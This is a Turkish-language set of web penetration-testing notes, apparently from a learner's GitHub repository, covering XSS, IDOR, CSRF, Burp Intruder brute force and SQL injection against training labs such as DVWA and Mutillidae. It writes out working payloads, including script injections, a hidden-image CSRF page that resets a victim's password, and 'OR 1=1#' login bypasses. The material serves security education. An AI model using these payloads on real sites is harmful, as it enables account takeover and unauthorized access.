> ## XSS Reflected Ajax Json

- Burpsuite açıyoruz
- ```intercept is on``` diyoruz
- Linkte herhangi bir bilgi görünmüyor ama ```burpsuite``` kullanarak yakalabiliriz. ```GET``` isteği yolluyor ve ```title=movies...``` şeklinde yolluyor
- ```script``` kodlarının çalışmadığı durumlarda ```<img src=a oneerror?alert(hacked)``` deneyebiliriz. Bu kod a kaynağından fotoğraf yükler ve yükleme esnasında bir hata olursa ```oneerror```'u bastırır. Bu kod içine javascript kodu koyabiliriz
- Site linkini başkasına yollarken siteden tamamına erişemediğimiz için yine ```burpsuite intercept is on``` içinde görebilriz ve o kısımı yollayabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.38.17.jpeg)

> ## XSS Stored

- Blog benzeri birşeyler kaydedebileceğimiz sitelerde çalışır
- O sayfaya giren herkes o saldırıya uğrar
- Yine ```<script>alert("hacked")</script>``` vb kodları deneriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.45.49.jpeg)

# Broken Access Control

- Erişimlerin yanlış uygulanması açığıdır

> ## Broken Auth Insecure Login Form

- Sağ tık yapıp ```view source``` diyerek HTML kodlarına bakıyoruz
- ```Source code``` içine kullanıcı adı ve şifre gizlemişler
- CTF'ler ve mülekatlar dışında çok fazla karşımıza çıkmaz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.47.26.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.48.25.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.49.29.jpeg)

> ## Broken Auth Logout Management

- Çıkış yaptıktan sonra geri tuşuna basıp geri session içine giriyorsa açık vardır
 
> ## Broken Auth Administrative Portals low level

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.55.27.jpeg)

- Bu sayfa kilitli diyor
- URL içinde ```.php?admin=0``` kısmını ```.php?admin=1``` yaparsak sorun çözülecektir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.55.14.jpeg)

- URL içinde yoksada ```Burpsuite intercept is on``` yaparak ulaşabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.58.11.jpeg)

> ## Broken Auth Administrative Portals Cookie

```Burpsuite intercept is on``` yaparak yakalayarak ```cookie``` kısmından ```admin=0```'i ```admin=1``` yaparak açabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.04.56.jpeg)


# IDOR Insecure Direct Object References

- Kullanıcıdan bir girdi aldığımız sitelerde geçerli bir açıktır (Şifre, Şifre hatırlatma metni vb.)

> ## Insecure DOR Change Secret

- ```Burpsuite intercept is on``` yapıyoruz 
- Sitemize dönüp sayfayı yeniliyoruz
- ```Request Body Parameters``` içinde 3 değişken bulunur
- Bu parametreleri değiştirerek başka kullanıcıların secret bilgilerini değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.15.51.jpeg)

> ## Insecure DOR Reset Secret

- Parametre olarak atanmayan değerlerde HTML kodundaki ```login``` kısmını değiştirerek başka kullanıcıların secret bilgilerini değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.18.05.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.19.51.jpeg)

> ## Insecure DOR Order Ticket

- Alışveriş sitesi vb sitelerde görülür
- ```Burpsuite intercept is on``` yapıyoruz
- Bilet sayısını giriyoruz ve ```Burpsuite``` üzerinden yakalıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.24.31.jpeg)

- ```ticket_quantity``` ve ```ticker_price``` parametrelerini değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.26.43.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.27.03.jpeg)
# Portswigger

- [Portswigger.com](https://portswigger.net/) içinde deneme yapabileceğimiz lablar bulunan site

> ## Başkasının Chat Geçmişini Okuma

- [Portswigger.com](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references) sitesine giriyoruz 
- ```Live chat``` kısmına giriyoruz
- ```View transcript``` diyerek mesaj geçmişini PC'mize indirebiliriz. Bu sitede "2.txt" den başlıyor
- ```Burpsuite intercept is on``` diyoruz
- Yakaladığımız bağlantı bilgileri içerisinde ```2.txt``` içeren birşeyler arıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.48.36.jpeg)

- Onu değiştirerek ```forward```'lıyoruz. Bu sayede başka kullanıcıların konuşma geçmişini elde edebiliriz
- Bu site için ```1.txt``` yaparak daha eski konuşma bilgilerine erişebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.49.13.jpeg)

# Metasploitable 2 DataBase Değiştirme

- ```metasploitable 2``` açıyoruz
- ```sudo nano /var/www/html/config.inc``` açıyoruz
- ```$dbname=`metasploit`;``` yerine ```$db=`owasp10`;``` yazıyoruz

# Mutillidae Cookie

- Siteye sağ tıklayıp ```inspect``` diyoruz
- ```Storage``` kısmında ```cookie```ler bulunur
- ```uid (unique ID)``` aynı kullanıcı adına sahip kişileri ayırmamızı sağlar
- ```uid```'i değiştirerek başka kullanıcılara erişebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.56.54.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.16.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.58.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.51.jpeg)

- ! Google'dan "cookie manager firefox" diyerek cookie editleme eklentileri ekleyebiliriz

# CSRF Cross Site Requset Forgery

- ```CSRF``` istek yapmanın sahtekarlığıdır
- Yapılan isteklerin başka kullanıcılar için manipüle edilmesidir
- Genellikle şifre değiştirirken karşımıza çıkar

> ## CSRF Mutillidae

- ```Burpsuite intercept is on``` yapıyoruz 
- Bloga yazı yazıp yolluyoruz ve burpsuite'den yakalıyoruz
- Yakaladığımız parametreleri değiştirmeyi deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.07.59.jpeg)

- ```uid```'yi 1 yapıyoruz ve bloga admin adıyla yazmayı deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.08.18.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.08.29.jpeg)

> ## CSRF DVWA

- ```Burpsuite intercept is on``` yapıyoruz
- Şifremizi yazıp burpsuite üzerinden yakalıyoruz ve parametrelere bakıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.12.25.jpeg)

- ```Burpsuite```'den yakaladıktan sonra sağ tıklıyoruz ve ```send to repeater``` diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.22.15.jpeg)

- ```Repeater``` yollanan isteğin cevabını hızlıca görmemizi sağlar
- 2 şifreyi aynı girince şifremiz değişiyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.25.24.jpeg)

- 2 şifreyi birbirinden farklı olarak değiştiriyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.26.07.jpeg)

- Şimdi acaba ```GET request``` linkini başkasına yollayıp o linke tıklanırsa hedef kullanıcın şifresi değişir mi onu deniyoruz
- Sağ tık yaparak ```copy URL``` diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2012.50.45.jpeg)

- Yolluyoruz ve linke tıklayınca tıklayan kullanıcın şifresi linkte belirlenen şifre oluyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.33.04.jpeg)

> ## CSRF Link ile Hackleme

- Bu linki başkasına yolladığımız zaman şifresinin değiştiğini anlayabilir bunun için web sayfası oluşturuyoruz
- ```<img style="display::none", src="http://192.168.126.132/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change", alt="">``` kodunu site kodları içine yerleştiriyoruz
- Hazır sitelerin HTML kodlarının içine ekleyebiliriz
```
<!DOCTYPE html>
<html>
	<body>
		
		<img style="display::none", src="http://192.168.126.132/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change", alt="">
	
	
	</body>

</html>
```
- Kodlarıyla açılcak site beyaz ekran olur ama yinede şifre değişir
- ```display::none``` dersek açılan sayfada görünmez
- Artık içinde bu kodu bulunduran siteye tıklayan kişilerin şifresi linkte belirlenen şifreyle değiştirilir

# Brute Force 

- Bir kullanıcının şifresini deneyerek bulma yöntemidir

> ## Şifre Bulma

- ```Burpsuite intercept is on``` diyoruz
- Detaylara bakıyoruz GET isteği yolluyor
- Burpsuite'e sağ tıklayarak ```sent to intruder``` diyoruz
- ```Position``` içinden parametreleri beliyoruz
  - ```Clear``` diyerek temizliyoruz ve neyi test ediceksek onu seçiyoruz ve ```add```diyoruz
  - Saldırı tipini belirliyoruz (```Sniper``` tek bir parametreyi test ederken kullanılır)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2012.53.14.jpeg)
  
- ```Payloads``` içinden denenicek kelimeleri ayarlıyoruz
  - ```Payload set:1``` diyoruz çünkü 1 şeyi seçtik ve onu deniyeceğiz ( 2 tane olması için sniper'ı değiştirmemiz gerekiyor)
  - ```Payload type: normal list``` seçiyoruz
  - ```Payload options: load``` diyoruz ve wordlistimizi seçiyoruz ```/usr/share/wordlist``` içinde hazır wordlistler bulunur
    - ```rockyou.txt``` içinde binlerce şifre bulunur
    - ```fasttrack.txt``` içinde en çok kullanılan 200-250 şifer bulunur
  - ```Add``` diyerek ekstra şifre ekleyebiliriz
- ```Attack``` diyoruz ve saldırıyı başlatıyoruz
- Hangi şifrenin doğru olduğunu direkt söylemiyor
- ```Status```'a bakıyoruz
  - ```200```: Bir cevap aldım
  - ```404```: Bulunamadı
  - ```500```: Server cevap vermedi 
- ```Length```' bakıyoruz. Length'i büyük olana tıklıyoruz ve ```response```'unu inceliyoruz. ```welcome to the password protected area admin``` bu sitede şifre doğru demektir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.03.13.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.09.56.jpeg)

> ## Kullanıcı Adı ve Şifre Bulma

- Kullanıcı adınıda bilmiyorsak 
- ```Burpsuite intercept is on``` diyoruz giriş yapıp yakalıyoruz
- Sağ tık yaparak ```send to intruder``` diyoruz
- ```Kullanıcı adını ve şifreyi``` seçiyoruz
- Saldırı tipini ```Cluster Bomb``` seçiyoruz
- ```Payload set 1``` içine kullanıcı adı wordlistini ya da kendi istediğimiz kullanıcı adlarını giriyoruz
- ```Payload set 2``` içine şifre wordlist'lerini ekliyoruz
- ```Attack``` diyoruz ve deneyemeye başlıyor 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.52.39.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.52.27.jpeg)

# SQL 

- Genel olarak bir websitesi veya bir sunucu içindeki veritabanında kullanılır
- Birçok yerde kullanılır (web development, mobil oyun dev.) ama genellikle sunucudan veri çekmek için kullanılır
- En çok karşılaşılan ve en tehlikeli açık türüdür
- [Sqliteonline](https://sqliteonline.com/) sitesinden online sql komutları test edilebilir
- SQL yapısı excel'e benzer

# SQL Komutları

> ## Tablo Listeleme
- "*" her şey anlamına gelir
- ```SELECT * FROM demo;```: Demo tablosu içerisindeki tüm kayıtları çağırır 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2016.57.39.jpeg)

> ## Tablo Oluşturma

- ```CREATE TABLE IF NOT EXIST test (id INTEGER PRIMARY KEY, name VARCHAR, age INTEGER);``` Eğer "test" isminde tablo yoksa "test" isminde tablo oluşturur (Primary Key id'nin otomatik 1'er 1'er artmasını sağlar)

> ## Tabloya Veri Ekleme

- ```INSERT INTO test (name,age) VALUES ('Ahmet',25);```: Tablo içerisine name'i "Ahmet" age'i 25 olan bir veri yerleştirir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.28.24.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.29.57.jpeg)

> ## Tablo Filtreleme

- ```SELECT * FROM test WHERE id=1;```: id'si 1 olan kullanıcıyı gösterir
- ```SELECT * FROM test WHERE name='Tarkan';```: İsimi tarkan olan kullanıcıyı gösterir
- ```SELECT * FROM test WHERE name LIKE 'P%';```: Test tablosunun name sütununda "P" ile başlayanları gösterir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.33.35.jpeg)

- ```SELECT * FROM test WHERE name LIKE '%N';```: Test tablosunun name sütununda "N" ile b,tenleri gösterir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.33.49.jpeg)

> ## Tablo Güncelleme

- ```UPDATE test SET age=38 WHERE name='Tarkan';```: İsimi tarkan olanların yaşını 38 olarak günceller
- ```UPDATE test SET age=22 WHERE id=1;```: id'si 1 olanın yaşını 22 olarak günceller

> ## Tablodan Veri Silme

- ```DELETE FROM test WHERE id=2;```: id'si olanın verilerini siler

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.39.37.jpeg)

> ## 2 Tabloyu Birlikte Listeleme

- ```SELECT FROM test UNION SELECT * FROM demo;```: 2 tabloyu birleştirerek gösterir
- Test tablosunun sütun isimlerine göre listelenir
- 2 tablodaki sütun sayısının aynı olması gerekir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2018.14.18.jpeg)

![](![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2018.30.14.jpeg))

> ## Tablodaki Sütun Sayısını Bulma

- Sunucuda kaç tane sütun olduğunu bilmediğimiz durumlarda "*" kaldırıyoruz ve onun yerine 1,2,3,4... koyuyoruz
- ```SELECT * FROM test2 UNION SELECT 1,2,3,4 FROM test``` şeklinde tek tek deniyoruz ve kaç tane sütun olduğunu buluyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.09.37.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.11.33.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.09.52.jpeg)

> ## Tablodaki Verileri Çekme 

- ```SELECT * FROM test2 UNION SELECT id,2,3,name FROM test;``` şeklinde tahmin yapabiliriz. 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.16.02.jpeg)

- ```SELECT * FROM test2 UNION SELECT id,2,3,name FROM test;``` şeklinde yazabiliriz sadece name içindeki veriler 3. sütunda listelenir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.16.17.jpeg)

- "Name" yerine e-mail vs yazıp test yapabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.16.41.jpeg)

# SQL Injection

> ## SQL Post Methodu

- Kullanıcı adı: Jamess ve Şifre yerine "'" koyuyoruz ve deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2017.47.44.jpeg)

- ```Diagnotic Information``` kısmında bulunan kodu not alıyoruz
- ```SELECT * FROM account WHERE username='jamess' AND password='''``` olduğunu görüyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2017.49.07.jpeg)

- ```SELECT * FROM account WHERE username='jamess' AND password='123456' AND 1=1#``` deniyoruz, eğer sisteme giriş yapabilirsek SQL enjeksiyonu yapabiliriz demektir
 
  - | Kullanıcı Adı | jamess |
    | --- | --- |
    | Password | 123456' AND 1=1# |
  - ```#``` Sonrasında yazılan kodu çalıştırmaz, bazı sitelerde ```#``` engellenmiş olabilir o durumlarda ```--```'da aynı işe yarar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.07.20.jpeg)

> ## SQL Şifre Girmeden Login Olma

- ```SELECT * FROM account WHERE username='jamess' AND password='123456' OR 1=1#``` deniyoruz, yani;
- Böyle durumlarda kullanıcı adının bir önemi yoktur id'si 1 olan kullanıcı olarak giriş yaparız ve genellikle bu kişi admin olur

- | Kullanıcı Adı | jamess |
  | --- | --- |
  | Password | abcd' OR 1=1# |

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.12.10.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.32.14.jpeg)

- Bu sefer kullanıcı adı üzerinden işlem yapıyoruz ve ```SELECT * FROM account WHERE username='jamess'# AND password='abvdsb'``` deniyoruz, yani;

- | Kullanıcı Adı | jamess'# |
  | --- | --- |
  | Password | avbc |

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.06.51.jpeg)

> ## Daha Güvenli Sitelerde SQL Açığı

- ```Burpsuite``` kullanıyoruz 
- ```Intercept is on``` yapıyoruz, siteye kullanıcı adı ve şifre giriyoruz
- Eğer yolladığımız bilgiler engellenip burpsuite düşmüyorsa ```clientside``` kısmında kontrol ediliyor sunucuya gitmiyor demektir
- Girmeyi denediğimiz fakat site tarafından engellenen şifreleri ```burpsuite -> parametre``` kısmından değiştirebilir ve öyle rahatça giriş yapabiliriz
- Password kısmına ```1' OR 1=1#``` giriyoruz
- Sitede filtreleme olmuş olsa bile bu yöntemle giriş yapabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.28.28.jpeg)

#SQL Get Methodu

- URL üzerinden değişiklik yaptığımız yöntemdir ancak yine giriş ekranıda kullanılabilir
- Yollanılan parametreler URL üzerinden bize gösterilir

- | Kullanıcı Adı | jamess'# |
  | --- | --- |
  | Password | 123 |

- ```http://192.168.123.122/mutillidae/index.php?page=user-info.php&username=jamess%27%23&password=123&user-info-php-submit-button=View+Account+Details``` şekline URL'de görülür
- ```Burpsuite decoder``` kısmında yazıları istediğimiz formatda görüntüleyebiliriz
- ```Encode``` seçilen formata çevirir
- ```Decode``` seçilen formattan geri çeviri
- Bu yöntemle HTML, URL vb şeyleri kırabiliriz
  - ```%27``` : "'"
  - ```%23``` : "#"
  - ```%20``` : (boşluk) 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.56.47.jpeg)

- SQL açığı test edilirken, giriş yapma sırasında ```ORDER BY```'da kullanılabiliyor

- | Kullanıcı Adı | jamess'# |
  | --- | --- |
  | Password | 123dasdas' ORDER BY 1# |

> ## SQL 
> ## SQL Union Select Sütun Sayısı Öğrenme
> ## SQL Union Select Database Öğrenme
> ## SQL Union Select Tablo İsimlerini Öğrenme
> ## SQL Union Select Sütun İsimlerini Öğrenme
> ## SQL Union Select Sütun İçindeki Bilgileri Öğrenme
